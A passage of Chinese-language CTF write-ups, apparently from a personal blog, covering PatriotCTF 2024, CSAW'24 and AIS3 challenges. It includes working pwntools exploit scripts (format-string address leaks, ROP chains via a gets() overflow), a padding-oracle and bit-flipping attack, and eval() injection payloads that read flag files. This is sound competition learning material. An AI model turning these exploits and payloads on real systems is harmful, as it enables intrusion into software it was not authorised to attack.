題目會解析密文(json)，並讀出username和role的值\n一旦username = \u0026quot;administrative_user\u0026quot;, role = 1\n就可以進入admin console，可執行print()指令\n解法 #\r弱點\n解密後會判斷padding是否正常\n這讓我們可以用padding oracle來獲得block解密後的訊息\n再加上可控制iv，所以我們可以有辦法改變整個密文\npadding檢查:\n但這個padding判斷的方式有點奇怪\n如果只需一個bytes的padding，可以是\\x00或\\x01\n所以padding oracle要先找出最後一個byte是\\x00和\\x01 並判斷哪個是\\x01 (\\x00倒數第二個byte必定找不到因為\\x02\\x03不符合padding規則)\n我們知道\n$$ \\begin{align*} P_1 \u0026amp;= D(C_1) \\oplus IV \\cr P_2 \u0026amp;= D(C_2) \\oplus C_1 \\cr P_3 \u0026amp;= D(C_3) \\oplus C_2 \\cr \\end{align*} $$ 所以我們可以透過padding oracle構造這些資料\n$$ \\begin{align*} C_3 \u0026amp;= \\text{aaaaaaaaaaaaaaaa} \\cr\nC_2 \u0026amp;= D(C_3) \\oplus P_3 \\cr\nC_1 \u0026amp;= D(C_2) \\oplus P_2 \\cr\nIV \u0026amp;= D(C_1) \\oplus P_1 \\cr\n\\end{align*} $$\n送出$IV+C_1+C_2+C_3$就可以進入admin console了 最後利用bit flipping 執行print(flag)\nReverse #\rPacked Full Of Surprises #\r我好像是非預期解\n題目 #\r可以讀入flag.txt\n加密後寫出flag.txt.enc\n解法 #\r於是我把原本的flag.txt.enc存成encrypted_flag.enc 把file read/write 當做 input/out solve:\nimport subprocess from tqdm import * elf_path = \u0026#34;./encrypt\u0026#34; flag = b\u0026#39;\u0026#39; correctflag = open(\u0026#39;encrypted_flag.enc\u0026#39;, \u0026#39;rb\u0026#39;).read() for i, ch in enumerate(correctflag): for byte in trange(0x20, 0x7f): open(\u0026#39;flag.txt\u0026#39;, \u0026#39;wb\u0026#39;).write(flag + bytes([byte])) subprocess.run([elf_path]) result = open(\u0026#39;flag.txt.enc\u0026#39;, \u0026#39;rb\u0026#39;).read() if result[i] == ch: flag += bytes([byte]) break print(flag) AI rnd #\r題目 #\r感覺是串流加密\n解法 #\r用上題的方式可以大致解出，但相同字元可能會出現分歧，但我們可以猜測flag的字元 import subprocess from tqdm import * elf_path = \u0026#34;./ai_rnd\u0026#34; flag = \u0026#39;\u0026#39; cur = \u0026#39;a5 39 24 90 a8 a5 88 77 26 e4 3c 14 03 1e ba 3c 7d bb dc d6 aa 90 50 c9 0f aa dd 57 33 e1 a4 c7\u0026#39;.split() for i in range(64): a = [] for byte in range(0x20, 0x7f): process = subprocess.Popen( [elf_path], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True ) stdout, stderr = process.communicate(input=flag + chr(byte)) if stdout.split()[i] == cur[i]: print(flag) a.append(chr(byte)) if len(a) \u0026gt; 1: print(a) i = input(\u0026#39;what: \u0026#39;) flag += i else: flag += a[0] ","date":"2024-09-30","externalUrl":null,"permalink":"/writeups/patriotctf-2024/","section":"Writeups","summary":"Intro #\rranking #\r團隊總排名33/1360|2%","title":"PatriotCTF 2024","type":"writeups"},{"content":"\rintro #\rranking #\r總排名193/1184|TOP 16%\nsolves #\rCategory solves Intro 2/3(feedback沒寫) OSINT 2/4 Forensics 2/5 Web 1/5 Crypto 3/5 Pwn 3/4 Reverse 2/4 這次比賽只有我一個人，再次體會到團隊合作的重要性\n題目沒有很難，也有可能是我解德剛好都不難 BTW這次比賽有睡爽爽，肝一下有可能爬到前百\nINTRO #\rflag #\r但有人不解，什麼諧咖\nOSIRIS Trivia #\r用 wayback machine 找之前的存檔\nOSINT #\rRickshaw #\r車牌77 CD-xxx，CD代表有外交任務，77代表美國\nU.S. Embassy \u0026amp; Consulates in India找電話號碼\nAuthentic Chinese Food #\r從電話號碼718-875得知位置為Brooklyn, New York\n找到當地的Panda Express 從NYC Department of Health and Mental Hygiene找衛生評級 從NYC Property Information Portal找Year Built、llc Forensics #\rZipZipZip #\r題目給的chalenge.zip，包了很多層zip+txt 檔案結構大概長這樣\nchallenge\r├── chunk_0\r│ ├── chunk_0.txt\r│ ├── chunk_1\r│ │ ├── chunk_1.txt\r│ │ ├── chunk_2\r│ │ │ ├── chunk_2.txt\r│ │ │ └── chunk_3.zip\r│ │ └── chunk_2.zip\r│ └── chunk_1.zip\r└── chunk_0.zip 但每個chuck_##.txt都只有五個字元，可以利用這點讀出所有字元\n一個檔案在這個zip格式大概為檔名|內容|504B\n取前十個字元base64 decode可以得知這是一張圖片的base64\nsolve:\nimport base64 s = open(\u0026#39;challenge.zip\u0026#39;, \u0026#39;rb\u0026#39;).read().split(b\u0026#39;.txt\u0026#39;)[1:] flag = b\u0026#34;\u0026#34;.join([x[:5] for x in s]) open(\u0026#39;flag.png\u0026#39;, \u0026#39;wb\u0026#39;).write(base64.b64decode(flag)) flag.png:\nThe Triple Illusion #\rplaintext: key: solve:\nplaintext = \u0026#34;csawctf{heres_anew_key_decrypt_the_secretto_reveal_flag}\u0026#34; key = [0,0,0,0,0,0,0,0,15,23,23,4,7,0,22,1,23,28,0,18,10,12,0,7,23,2,17,18,21,16,0,0,0,0,0,28,7,16,17,16,6,17,11,0,1,0,21,23,4,24,0,0,0,0,0,0] for (ch, ch2) in zip(plaintext, key): print(chr((ord(ch)^ch2)),end=\u0026#34;\u0026#34;) 解是用xor，可以從plaintext的字元分布和key得知這兩者的關係\n另外這題其實有三張圖片，有一張藏了vigenere cipher\n但沒有用到解出來的資訊\nWeb #\rPlaying on the Backcourts #\r題目的app.py有eval()，利用他開啟leaderboard.txt(題目要求 )\npayload:open(leaderboard_path, 'r').read()\n==注:賽後題目連結掛了，沒實際截圖==\nCrypto #\rTrapdoor #\rfrom Crypto.Util.number import long_to_bytes, GCD c1 = 303135796212555524279246573902478466434668217093546174680188235179057490491567473700120780102242009132103258508861486434415180823527955099967761217116349255542170598035252007386938049207815599595446898483965896318999163451327331078078222461159124295427725319096144123597554777586957979868444674275889889844032174888734978810757381148576980597387087054100968752977308860522457902588682074271109316333433256639990524116155937375917691984587952422148443784463343758327600719630349711698888298784945165573146249574661292447746934401167219320522948251442094538198108317569766073873733715196594572438686070303424017394902382093899765518500483375456912409097537955914052714322746314137960293312838915565869071605155935644478996344290292865819278674982079257062718982942611077051220570396851353684880714275636550356149610683653718033949374671376446552695669216994087720088804557425225900737145094882031616103378878538121913250609632802433851115524402329496182016641849196645450203369856549243934741848598773875346669657888813923243297096273166067843490617097664952249302907248385981657386549425150606813818575526156807496438444686156127519692376856599876276294335897476875870006918535394383682369081298573978241442661476323352300777091182989 c2 = 495857475060520388524171972560562329613974853400983822020845888925730491600062430518172516899260704264560273781934223594302859722530534832340660062529848264990086782051303987790503975423180262299331338615407534533214682113133599329293031129085100449577992934518434344656657494285931938564813850628647927736024583131744532009049044693917571326537857384102056783307220756946741412271768559975747252067027985539444943113529028970650318126952304374213699662922237891802823976468380268943050107475055909459355423686208238246597053465755603350070481628534681615531080212087446170332283155265359882706315659670116316266081501682694077818665850673103109986674113042710753378454481553052577850617521346621778611947759859049949511238712479205224753501152768840659660348125732219509602068105609818744217345793400652546782588924616710717604789311834310946503565014125112936386821830814255281895686800886900005134607852450727343155282371024191291186227931359848093297797055981177703223050327072826245731656444970746670962178893596866749248985055819064026711206591064102568684210270239031311552084894623247525907933925015980322475751964290174523048766068652767848785157128558417911661948655949158005943910504885480428658407000419115833416727420060 e = 65537 n1 = 849335341290886685305469218391857707731284340958190419070185843136010157709429053610422484475132681533748719098278969826215644874339472967353132551879455362882996907567507113593506825753079778590426114664641480816600384751471656645291232769230937136910355259284237110429149485567788006502323613635933685865306368710784061314928154920731534552117321317277211567493110152566489842583624729165341328622863262200606012259883201617700955694695922994087859464481658597983611169234466124699760530832690946886672455760158700223782288051380457731164725645861312489664513789670524826747778520365562211927266455463083486309711423210020471808741823123222068864708556581964581065834988620566447012299912244270348094665860535141932228229489208553114464044014430205989899364599981035118586030905442204839171480278940939019668106564678143657774136844418987220537475593181825555444917027626563850710659384061650161954669583365646428622075935490337721802367242209967740698482568921310122475447746639557770945332710012170102525879752975818050520509857439519049644785825032104077215376906019647567250546984958145151649505898444718072843209364124945650856086793772364425465519611908098951364026287867524069822425347155753599639554767185278129507433506309 n2 = 603523566530333849178340428498944902666363745873836128019046104968850160788559626859110536807737092301279190275717524103231817119850380847226716405338227641758799619075339058107790224618949070936355847696512320584610781171628029295879025358995297274114650904664397977445850692346888664395462514491694005594326981267020658004853078220869498716454480503670832534655687832674317698341533791287606520109612425394700304038251923496303824119858678564161604483027565550190673989872119144198248907235642586281776334255518772240197897432768870606595017185449736217266994920355907164372528751413042250719701199348091884608946014594175762002630845986429797454686315898064893067919327646448166242760968074216672400981626176888822037453360011497389835122764853203956625199041071100777042750119671525508293375356678113231545760621792785884810027728859682751883206526242837955866065528264740145465244712713969196077012700370049597156003550177262301319126400428989863912190142334126607178261626969803469625974325630891730058651069671841464378913213797770918193912221804892109419238634557345136168738280281615754564955678609409321720136879847520102473459064293144553235291623089686442091239836122526756636264103227262956791809160643363991596481281713 def rsa_decrypt(c, p, q): phi = (p - 1) * (q - 1) d = pow(e, -1, phi) return long_to_bytes(pow(c, d, p * q)) p = GCD(n2, n1) q1 = n1 // p q2 = n2 // p print(rsa_decrypt(c1, p, q1)) print(rsa_decrypt(c2, p, q2)) n1和n2有公因數，直接分解\nDiffusion Pop Quiz #\r這題他給了一個script，主要是在描述透過sbox擴散(diffusion)\n題目是問答題，只要達成他給的問題(實際執行一次)就可以拿到flag\nAES Diffusion #\r跟上題一樣，是要學AES diffusion\n||弄一弄就有flag了\u0026hellip;||\nReverse #\rBaby Rev #\r點點點就找到了\n拿去base64 decode\nMagic Tricks #\r逆向加密過程的題目\n把一段文字丟進去會得到一段亂碼叫做output.txt\n所幸相同相同輸入字元-\u0026gt;相同輸出字元\n只是輸出的字元編碼不是ascii\n但utf8可以用\n解題過程:\n程式中輸入所有可視字元，因為我們知道flag只可能用ascii可視字元組成 用python read output作為對照表 alphabet = \u0026#34;!\\\u0026#34;#$%\u0026amp;\u0026#39;()*+,-./0123456789:;\u0026lt;=\u0026gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~\u0026#34; output = open(\u0026#39;output.txt\u0026#39;, \u0026#39;r\u0026#39;, encoding=\u0026#34;utf-8\u0026#34;).read() cipher = open(\u0026#39;cipher.txt\u0026#39;, \u0026#39;r\u0026#39;, encoding=\u0026#34;utf-8\u0026#34;).read() #I renamed challenge\u0026#39;s output.txt to cipher.txt flag = \u0026#34;\u0026#34;.join(alphabet[output.index(ch)] for ch in cipher) print(flag) Pwn #\rDiving Into Null #\r一個壞掉的bash，沒有ls和cat，所以要自己手刻一個:\nls:\nfor f in *; do echo \u0026#34;File -\u0026gt; $f\u0026#34;; done ls -a:\nfor f in *; do echo \u0026#34;File -\u0026gt; $f\u0026#34;; done reference\ncat filename:\necho $(\u0026lt;filename) 然後在~/\n執行剛剛手刻的ls -a，可以看到.flag\n再執行\necho $(\u0026lt;.flag) 就可以得到flag了，||這什麼怪題||\nMini Golfing #\r這題有開ASLR，不能亂跳\n可以利用printf找到main的位置，然後算offset\nsolve:\nfrom pwn import * # context.arch = \u0026#39;amd64\u0026#39; # context.terminal = [\u0026#39;tmux\u0026#39;, \u0026#39;splitw\u0026#39;, \u0026#39;-h\u0026#39;] # # r = process(\u0026#39;golf\u0026#39;) # gdb.attach(r) r = remote(\u0026#39;golfing.ctf.csaw.io\u0026#39;, 9999) r.sendlineafter(b\u0026#39;? \u0026#39;, b\u0026#39;%171$p\u0026#39;) r.recvuntil(b\u0026#39;hello: \u0026#39;) start_addr = int(r.recvline().strip(),16) win_addr = start_addr - 0x223 + 0x209 print(hex(win_addr)) r.sendlineafter(\u0026#39;aim at!:\u0026#39;, hex(win_addr)) r.interactive() Nix Philosophies #\r看起來像是用C++的字串來混淆\n但程式功能如下:\n輸入字串 sum(自己取的) = 從第二個字元開始後的每個字元ascii相加 read(sum - 1603, buf, 32) 解法：\nfd(0)是stdin，所以就可以控制buf了\naaaaaaaaaaaaaaaaa3的sum=1603 -\u0026gt; fd是0\n輸入make every program a filter\n就可以得到flag了，這次比賽都沒正常的pwn:(\n","date":"2024-09-10","externalUrl":null,"permalink":"/writeups/csaw-2024/","section":"Writeups","summary":"intro #\rranking #\r總排名193/1184|TOP 16%","title":"CSAW'24 CTF Writeup","type":"writeups"},{"content":"\r前言 #\r先不說是不是用運氣打的(那題pwn是我半夜夢到解法起床解的)\n題目蠻有趣的，值得參加\nMisc #\rwelcome #\r複製貼上\nQuantum Nim Heist #\r首先move完一顆後，接下來如果讓你選擇，而你選擇0~2以外的選項\n伺服器就會當作你有做過操作了，但你其實沒有\n所以現在只有ai再取石頭\n等到ai取到剩下一排，把那一排取掉就可以獲勝得到flag\nThree Dimensional Secret #\r開啟的封包檔，前面一一個Cura_SteamEngine 5.6.0 找到Cura SteamEngine後，發現這是一個3d列印軟體 把這個tcp stream改成副檔名.gcode後 再用Cura SteamEngine該起就有flag了 Emoji Console #\rflag是一個資料夾 拿到app.py和Emoji、command的對照表 flag裡面由一個flag-printer.py 執行並得到flag\nCrypto #\rbaby RSA #\r從source code可以知道他是針對每個字元進行加密的 所以只要爆破就可以得到flag了\nflag = [59582983136368434856816799733313446746433796034384724221174424464969737874802116129348607979328098841766335449896610931770063087921739964156335144291643702667891887833963756948394265219864837961748202920096128332905237576243643095664147826020400199347355043162641743846198725931842313977049712473768688780204, 95359547394031742813518330673269556403528254059894407470006786975603938062435320319282644182444182438612748874603359501010449113346386193598111715879103479311697744375488228536365895249959983701008182395138745363343749821348881488616739650767615867269542213617639437927373484681942750228038458670913761461906, 46329325300279098651694178842591774415260876326218182283454895682597312145324055490326488805186682301528705330448500034219715636964856131530973835780285303243952273742119154142469279746360304190118988650200422700136950019141246372634642054318988506247030406078971388938494583721698317950574261574174233878465, 99372516099607712778908802720080113062724120782160998443385643772511391370661101893707293382044546993124605549696368316348952556779713164710839853078160450782104255053788389238478472574549113909833434906535103012424826026640284958298083646000213492094244631381094489147645893989473799375006911204994971262513, 76560888147807476608165550435978536197327212318831455594999273843368454289391559274947371380742007729563677938535717707232627424457601159959128489070947748904688640279908482263289424669338790488996485849079890881530740377280113682547250364463080771156212510360194563192123664613212111565777733487081937952558, 12319813533472769541026063795801870849236715810997656653501875874806446093919930377755747066386074676697058702735112064576219731845584108035461434499628574742399407498867908576045220515065246483998134315307132901329833371485817530138131352593805641664023978795298886913968639954517583992930243922021434381738, 96951009388162450018398074248238612521098089563081241061172635732154749686698900516806076917644927142046116130006730586770841058020946718314769404592479949673385387831784647829787593435525861689652400487918043078535385527278516028607916478700007746817161408140805937414915909575928550204945457887011906141614, 1665805297521640119669919457094144711238099413231800824465470812913880572669116305626521524153911904267238129531937952423409222225023467794927666422627082314285814656075569814644205638687105792760533211008966815918943917251927254624389871965679206262024216136163262412286874416732008465838711695063592124435, 38031617734525236754862788270684927634041250565347090806313746312968815507316236887544784308484734926981400017478758364119367924220519253824976349577671434162884831759762106665665138444165001645856871491952279748415831766579735400499998753646766301606966507940299051979075677572064596983713461662607114250263, 64855027109789931203406858899259092299626327163376469398846102754805420506427252072315662287801006608894162707199492268892939811482863649987034183371607590158980649349849687594118554925649076468007225363531072941142253057862686631842080812159597499430107963982315266135241847383726503265496996481889717246182, 38285633551521777138710771085033430239170710707266775875598456653892976969437761922968925746226073683095654278272586779539831402373205526909772633370025848937463033570747721110932401276480992827694564074802181306738438015295515798739406061377284368603543443076476369810597345436481251791260803352288977423573, 90968383857681404242927909477464252602387471219945950453665598772039832078487309149670692874283215437984574695320981806360379096212936326954111131608499584545969103096096842380877613033764006459107764277330135816044808210474597200172673683909558627722941503504083244424751773797618360290613996970960151563724, 95457298055868694391877219138576497445115151186056513418820503159496876268497080831408725541436969299827723238663173668798694515208450035233192338795425824459299174728295661096981248839235055855929604893139239340445385259232905864515397406993189217322907168121716905101208450279521267289056195400878302077398, 52468135911274945777529136529541932989316502665934748207836694395110108517204287366878248216053327656034128346107236076714109214143042824050810182510919475258788845504651287598248217763885663385525333584236650693667648746329707103824387098563158188013686337454772275459145419197015884603853408230553227896407, 34661612116812273325510815885632987773878634626625747042958636362152583931260969561869719786378247664638641161656878412129162010084766438156247296031040184022246208883138926132649114007757242227131459285251878118564710945280013332131793855359773876332415772442620349609897435915019325055421286197078708187352, 52468135911274945777529136529541932989316502665934748207836694395110108517204287366878248216053327656034128346107236076714109214143042824050810182510919475258788845504651287598248217763885663385525333584236650693667648746329707103824387098563158188013686337454772275459145419197015884603853408230553227896407, 72893301186321303683272295658327353212060838237559048917336264819112421968115615005989580760612444279776561566669272155758039717810976344470895667733780292960024364644216982543515945404550612735708418065359731237914621596888496631385879381090937225999965270114589266587955012094766794851372212812150698234716, 67602482196856820166971428403758405739455475263382367621161896414339370625380754447863410276767241406699969322350803814348655243066328706656427717483623041308690996376549835317954286006923639192767262817817435759143930376297271756237829141630002480289781731985465743331200468015517012225741723423203374827341, 44262354102194743351911268289256770008339497245528544280709170541530088518398751380655719846628700171065092804544687718896291531970838072744874705570156704628202662829757806782131182294252555844059856971743311355891113953747318316062265029166813195656690004051327523203179399349334322871113218009692321746302, 52468135911274945777529136529541932989316502665934748207836694395110108517204287366878248216053327656034128346107236076714109214143042824050810182510919475258788845504651287598248217763885663385525333584236650693667648746329707103824387098563158188013686337454772275459145419197015884603853408230553227896407, 17525442355443739006798161136945234538289135293732159010469949341666347513585837371870704355037863634098163883611042121878362686860890223724238562583526550649340086051319234134907577624853632886715848962127706255769976443912657070070366400669740596805962173530384420842637554803041466900119050709458062167550, 44014841046589017601891983719958867760419600204352901036629548332837496204051161377933425345536644034794916246706885620488552830053604204333015893225255398323167834260921720336325397193593333461140140475610284003097590899522403244883330800589948361851693870192559674072749868797979125684663605722325053340834, 52468135911274945777529136529541932989316502665934748207836694395110108517204287366878248216053327656034128346107236076714109214143042824050810182510919475258788845504651287598248217763885663385525333584236650693667648746329707103824387098563158188013686337454772275459145419197015884603853408230553227896407, 32463563387229396502994321924065961632284043136468238906625180045736135155253223928723914405824284085442712712337348213915399745045346853697650399659292339726614512642835897683094877670342609027803404027945312939777902664125228095034970967750466928999176126534504349068649205422848461193336320361026425455874, 72893301186321303683272295658327353212060838237559048917336264819112421968115615005989580760612444279776561566669272155758039717810976344470895667733780292960024364644216982543515945404550612735708418065359731237914621596888496631385879381090937225999965270114589266587955012094766794851372212812150698234716, 12179738687529782107447590339149361896936551322934825418520525165858885435598866363152322677187041910693780230742925050834968940508546403788452893248148672885195158450001568668626998159030042932978014971079411358732702590558133373478956077176801426446288446920254354063720982962966912703174841575095158773376, 101125682339799901828662987568918086070282069568379908090074247169217184659644669626554838396604623590909101664987452894437649857681299514293609000818253780343589956828098266778252516930801354335366245918603834198786544373944956666900784678369416240212915856834107510529441463083826031881209805666209335413628, 101403644290884991310189664359755656780537902543354415482434580937410695343294757120985680350019917171639284125327989098680673553323894980248499865788837636944758311200094760909373728675822272584823764964753326309765279310435693879623302965536053211433064599526550676915084290753201910772032395483945950367273, 24333051506853181360030701569319128673885779416125109480872653360245763695810807795571148802002658160356587851857338891650119080260776136984074861612952869696123011417276568821410663401888348228549042676235853145756762295087473309782699704381451505573652641489540319626561348999020895690560418530256831740666, 20222920908058605457111970272150612273139460769260447235596498596781683961010128426184024637706564546340327246191020540223566835757304493325371606037680402571948650998523099138137441154209281794538860160477031997660506452095283151142470607354579609545040759974018408429796935802188551530478970289514572978617, 72893301186321303683272295658327353212060838237559048917336264819112421968115615005989580760612444279776561566669272155758039717810976344470895667733780292960024364644216982543515945404550612735708418065359731237914621596888496631385879381090937225999965270114589266587955012094766794851372212812150698234716, 32184464000490155748453165982143565340499464338829080683417468389784993809512708479494827939476307049612151190695993375700147700844413744001417893095868641387694266647992101758785355055413538046252854525860440227182911367045556141460084455472907278113962890024281663648508886642376786194323597791020547317088, 101125682339799901828662987568918086070282069568379908090074247169217184659644669626554838396604623590909101664987452894437649857681299514293609000818253780343589956828098266778252516930801354335366245918603834198786544373944956666900784678369416240212915856834107510529441463083826031881209805666209335413628, 44014841046589017601891983719958867760419600204352901036629548332837496204051161377933425345536644034794916246706885620488552830053604204333015893225255398323167834260921720336325397193593333461140140475610284003097590899522403244883330800589948361851693870192559674072749868797979125684663605722325053340834, 12179738687529782107447590339149361896936551322934825418520525165858885435598866363152322677187041910693780230742925050834968940508546403788452893248148672885195158450001568668626998159030042932978014971079411358732702590558133373478956077176801426446288446920254354063720982962966912703174841575095158773376, 63634815088527144255090148113948593793648445499224983027630191877159813968754095341812467946868079279626991968747689424489021633678743106301884613005477044402324870044751927862596590687251830485165119422247449722579599610918927243419033509419967393677988976255284611384351411782311379786356079256916831362626, 9304987377904341606117201715658113065608581640101320211543462955469900806281721467187032121463132314663326494170970278379001634044806680348131292368949519512445580695938064509920503814133961673755470696223243390646274004621955993274826096679460577701554059204349111764901921932386091658007427259226167178177, 58828925452729811932976588739787965824652220690551333824296205824127538696058603108169405357158211350616510470513672533759883740745736322687898383422522330915631984810878357007178714597068087752425823728826608887027664209314455243118645386520598961325656254330576959063500755210398248129074822706590225088700, 72893301186321303683272295658327353212060838237559048917336264819112421968115615005989580760612444279776561566669272155758039717810976344470895667733780292960024364644216982543515945404550612735708418065359731237914621596888496631385879381090937225999965270114589266587955012094766794851372212812150698234716, 32184464000490155748453165982143565340499464338829080683417468389784993809512708479494827939476307049612151190695993375700147700844413744001417893095868641387694266647992101758785355055413538046252854525860440227182911367045556141460084455472907278113962890024281663648508886642376786194323597791020547317088, 72893301186321303683272295658327353212060838237559048917336264819112421968115615005989580760612444279776561566669272155758039717810976344470895667733780292960024364644216982543515945404550612735708418065359731237914621596888496631385879381090937225999965270114589266587955012094766794851372212812150698234716, 12179738687529782107447590339149361896936551322934825418520525165858885435598866363152322677187041910693780230742925050834968940508546403788452893248148672885195158450001568668626998159030042932978014971079411358732702590558133373478956077176801426446288446920254354063720982962966912703174841575095158773376, 38031617734525236754862788270684927634041250565347090806313746312968815507316236887544784308484734926981400017478758364119367924220519253824976349577671434162884831759762106665665138444165001645856871491952279748415831766579735400499998753646766301606966507940299051979075677572064596983713461662607114250263, 42674155454878392842592499423860033988264245394501952163129442865919203299671995689679354090226093903765768139477289952989042795959374257614752953563152551974557414325407858919156902405925850703390450181868760242922958259454422450849566085988801215229822701373233313619020572460459663094142218119144686335871, 101125682339799901828662987568918086070282069568379908090074247169217184659644669626554838396604623590909101664987452894437649857681299514293609000818253780343589956828098266778252516930801354335366245918603834198786544373944956666900784678369416240212915856834107510529441463083826031881209805666209335413628, 75918055185950026238164530295762591705002247585433355113315303142207464051952569831664550604622541858093495062851840811257603174544255151597115446984458237694842739071530518936317606199598953518976167711716762043806043449827887577909963803673508838826582484003687958862302989732473748700329398645880243054148, 52468135911274945777529136529541932989316502665934748207836694395110108517204287366878248216053327656034128346107236076714109214143042824050810182510919475258788845504651287598248217763885663385525333584236650693667648746329707103824387098563158188013686337454772275459145419197015884603853408230553227896407, 42674155454878392842592499423860033988264245394501952163129442865919203299671995689679354090226093903765768139477289952989042795959374257614752953563152551974557414325407858919156902405925850703390450181868760242922958259454422450849566085988801215229822701373233313619020572460459663094142218119144686335871, 52468135911274945777529136529541932989316502665934748207836694395110108517204287366878248216053327656034128346107236076714109214143042824050810182510919475258788845504651287598248217763885663385525333584236650693667648746329707103824387098563158188013686337454772275459145419197015884603853408230553227896407, 47953002091054578020381201294163023730809574731463958773592358719441988187452655748118051277286650853337305718192021972814357369747332979634917684999259838316305009239963225119133204824897098152777119627043881500966537112886938182847527574241215915396651397126350467492479189194162628876529519538265140143596, 101403644290884991310189664359755656780537902543354415482434580937410695343294757120985680350019917171639284125327989098680673553323894980248499865788837636944758311200094760909373728675822272584823764964753326309765279310435693879623302965536053211433064599526550676915084290753201910772032395483945950367273, 52468135911274945777529136529541932989316502665934748207836694395110108517204287366878248216053327656034128346107236076714109214143042824050810182510919475258788845504651287598248217763885663385525333584236650693667648746329707103824387098563158188013686337454772275459145419197015884603853408230553227896407, 107340541989905757204370662416845552037146078905222935505789033122562501577684655501092154588544305605078885306044047839464564901594898750722560559313996616820973286189602827331851868376927628179028545097753144658073207307785378721899783095713473789007231709234504050418717400729711972350669632384570468096830, 43967923748936484351732805873555964174712775706889811180819474140612599586161884530658035908721232399384729457223641995556425707839305124083600738135036620220298476686325110132022730675370888898063942501477522619906479683016701151321856269078215479158146009655223314957908787521092587379267241203076718674092, 24333051506853181360030701569319128673885779416125109480872653360245763695810807795571148802002658160356587851857338891650119080260776136984074861612952869696123011417276568821410663401888348228549042676235853145756762295087473309782699704381451505573652641489540319626561348999020895690560418530256831740666, 20472445493228441292721090614657967895462252302228260568752427996680563809601852655319833688134475798137834395223726607334321531235376774219216055134601030184130917876549113091114144486261794932716233808194664233936783735663266743029212488020840969559603523111887524998658108503660068448898570323437482810017, 72893301186321303683272295658327353212060838237559048917336264819112421968115615005989580760612444279776561566669272155758039717810976344470895667733780292960024364644216982543515945404550612735708418065359731237914621596888496631385879381090937225999965270114589266587955012094766794851372212812150698234716, 64855027109789931203406858899259092299626327163376469398846102754805420506427252072315662287801006608894162707199492268892939811482863649987034183371607590158980649349849687594118554925649076468007225363531072941142253057862686631842080812159597499430107963982315266135241847383726503265496996481889717246182, 52468135911274945777529136529541932989316502665934748207836694395110108517204287366878248216053327656034128346107236076714109214143042824050810182510919475258788845504651287598248217763885663385525333584236650693667648746329707103824387098563158188013686337454772275459145419197015884603853408230553227896407, 75918055185950026238164530295762591705002247585433355113315303142207464051952569831664550604622541858093495062851840811257603174544255151597115446984458237694842739071530518936317606199598953518976167711716762043806043449827887577909963803673508838826582484003687958862302989732473748700329398645880243054148, 12708160939460449797746334640370189741594393156198590130563300705594742285274155378452384449752817944962371880018673966875751948953034846634284138305820292201281595210265881917297911731564408181887226462606892964361033320116765426523499831287478314065882300932476595216136350756971622192468975464823677154324, 52745488365658861485519010696623986434656675831322149607647058389953842185045922621964255927212518970223978973817292179059730382537814695353016058702226289640834171560498112170760826276332972100423555174686162215383841925656596984188536350046664199627214379076416024495451320834231863438007383528385204646269, 8855798603366167912634233401398286651752671525801140525178611090639905433230380535711326462952071294452556819384200831430822862220907470038589552641363759764881881084119960616686113091264272665290715332905431138686504873774368450566561688814993821800992967990682116846800657243011069696481920893909247794983, 96951009388162450018398074248238612521098089563081241061172635732154749686698900516806076917644927142046116130006730586770841058020946718314769404592479949673385387831784647829787593435525861689652400487918043078535385527278516028607916478700007746817161408140805937414915909575928550204945457887011906141614, 3085377115073481737487767519304315808353144937670566256348398664810936964565637157736537945459712875615504238408907602974507381828272609303797146395233485026377776965939508974096385939172942695211339651597248692728550782246178293579153110379844451779466255357619524290412118137515779354431956948078394927940, 48345447683174081443502925378502329908064423944850311779861406407783604557812792515281621715817536127803162311234459315836524837064977025182379655213338205159741266326939713833052921255157742860610743189155260503439836583887313584730345974553768985184119012533854386867355018502198395672167297716386558437643, 2943509185067047938273565758747957807917637430462018374124947856251091022696853505230975399503014099411245162812979057344198094444949853114144790397928000334361276864689352349519363636219566973775714458213611238774130167222835759501223813455853370320854862131109567941072112035263351158877256955712543549605, 76560888147807476608165550435978536197327212318831455594999273843368454289391559274947371380742007729563677938535717707232627424457601159959128489070947748904688640279908482263289424669338790488996485849079890881530740377280113682547250364463080771156212510360194563192123664613212111565777733487081937952558] e, n = (64917055846592305247490566318353366999709874684278480849508851204751189365198819392860386504785643859122396657301225094708026391204100352682992979425763157452255909781003406602228716107905797084217189131716198785709124050278116966890968003294485934472496151582084561439957513571043497031319413889856520421733, 115676743153063753482251273007095369919613374531038288437295760314264647231038870203981488393720761532040569270340726478402172283300622527884543078194060647393394510524980830171230330673500741683492143805583694395504141751460090539868114454005046898551218623342425465650881666420408703144859108346202894384649) for ch in flag: for i in range(128): if pow(i, e, n) == ch: print(chr(i), end=\u0026#34;\u0026#34;) break WEB #\rEvil Calculater #\r題目會執行你送出的post的資料，並回傳執行結果(過濾掉底線和空白)\npayload: open(\\\u0026quot;../flag\\\u0026quot;).read() 丟到burp即可 PWN #\rMathter #\r把goodbye()函數decompile之後可以發現這邊有一個gets()函數 可以利用這點跳到win1()和win2() 跳到win1()之後，函數會要求第一個引數的值為0xdeadbeef\n這時要利用ropchain:\npop rax; ret;\r0xdeadbeef\rwin1_addr 同理win2()會要求函數第一個引數的值為0xcafebabe\npop rax; ret;\r0xcafebabe\rwin1_addr source code:\nwin1 #\rfrom pwn import * context.arch = \u0026#34;amd64\u0026#34; context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] # r = process(\u0026#34;./mathter\u0026#34;) r = remote(\u0026#34;chals1.ais3.org\u0026#34;, 50001) # gdb.attach(r) win_addr = 0x4018d0 rbp_addr = 0x4bd000 pop_rdi_ret = 0x402540 rop = flat( pop_rdi_ret, 0xdeadbeef, win_addr ) payload = b\u0026#34;aaaa\u0026#34; + pack(rbp_addr, 64) + rop print(r.sendlineafter(b\u0026#34;Enter an operation and two numbers (e.g., 1 + 1) :\u0026#34;, b\u0026#34;q\u0026#34;).decode()) print(r.sendlineafter(b\u0026#34;Are you sure you want to leave? [Y/n]\u0026#34;,payload).decode()) r.interactive() win2 #\rfrom pwn import * context.arch = \u0026#34;amd64\u0026#34; context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] # r = process(\u0026#34;./mathter\u0026#34;) r = remote(\u0026#34;chals1.ais3.org\u0026#34;, 50001) # gdb.attach(r) win_addr = 0x4019A2 rbp_addr = 0x4bd000 pop_rdi_ret = 0x402540 